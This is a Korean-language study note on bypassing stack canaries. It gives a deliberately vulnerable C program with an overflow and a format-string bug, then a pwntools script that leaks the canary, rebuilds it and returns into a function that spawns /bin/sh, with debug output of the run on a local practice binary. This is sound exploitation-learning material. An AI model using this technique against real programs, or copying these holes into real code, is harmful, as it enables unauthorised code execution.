# 배경
스택 프레임과 SFP 사이에 실행시마다 바뀌는 램덤 값을 삽입
만약 이 값이 바뀌게 되면 바로 실행 종료


# 예시1
```c
#include <stdio.h>
#include <stdlib.h>

void shell(){
    system("/bin/sh");
}

int main(void){
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    char buf[50];

    read(0, buf, 200);
    printf(buf);
    read(0, buf, 200);

    return 0;
}
//gcc -fstack-protector -z execstack -no-pie -fno-pie -o canary_leak main.c
```

버퍼값 입력받고 출력한 후 다시 입력받는 구조
버퍼링 제거, canary 활성화, ASLR 비활성화, 코드 실행 스택 활성화

첫 번째 입력할 때, canary 직전까지 입력하면, `printf(buf);`까지 출력해서 canary값을 알아 낼 수 있음
이를 이용해서 shellcode 작성하면 exploit할 수 있음

버퍼 56바이트, Null 1바이트, canary 7바이트, SFP 8바이트, RET 8바이트
```
gef➤  x/100x 0x00007fffffffdde0
0x7fffffffdde0:	0x61616161	0x61616161	0x61616161	0x000a6161
0x7fffffffddf0:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffde00:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffde10:	0x00000000	0x00000000	0x195d3200	0x59df5a56
0x7fffffffde20:	0x00000001	0x00000000	0xf7c29d90	0x00007fff
0x7fffffffde30:	0x00000000	0x00000000	0x00401177	0x00000000
```

```python
from pwn import *

shell=0x0000000000401166
main_ret=0x000000000040122b

#p = gdb.debug('./canary_leak')
p = process('./canary_leak')
context.log_level = 'debug'

payload=b'a'*57
p.send(payload)

p.recvuntil("a"*57)

canary_value=b'\x00'+p.recv(7)

payload=b''
payload+=b'a'*56
payload+=canary_value
payload+=b'a'*8
payload+=p64(main_ret)
payload+=p64(shell)

p.sendline(payload)

p.interactive()
```

아래는 exploit한 결과임
canary는 0x39에서 0x3F까지 총 7바이트
shelllcode를 넣을 때 canary도 그대로 재현해서 넣은 모습
```sh
┌──(foo1㉿main-server)-[~/Desktop/kknock/Pwnable/canary_leak]
└─$ python3 exploit.py 
[+] Starting local process './canary_leak': pid 4915
[DEBUG] Sent 0x39 bytes:
    b'a' * 0x39
/home/foo1/Desktop/kknock/Pwnable/canary_leak/exploit.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("a"*57)
[DEBUG] Received 0x41 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000030  61 61 61 61  61 61 61 61  61 af 04 83  f1 8d 76 75  │aaaa│aaaa│a···│··vu│
    00000040  01                                                  │·│
    00000041
[DEBUG] Sent 0x59 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000030  61 61 61 61  61 61 61 61  00 af 04 83  f1 8d 76 75  │aaaa│aaaa│····│··vu│
    00000040  61 61 61 61  61 61 61 61  2b 12 40 00  00 00 00 00  │aaaa│aaaa│+·@·│····│
    00000050  66 11 40 00  00 00 00 00  0a                        │f·@·│····│·│
    00000059
[*] Switching to interactive mode
```

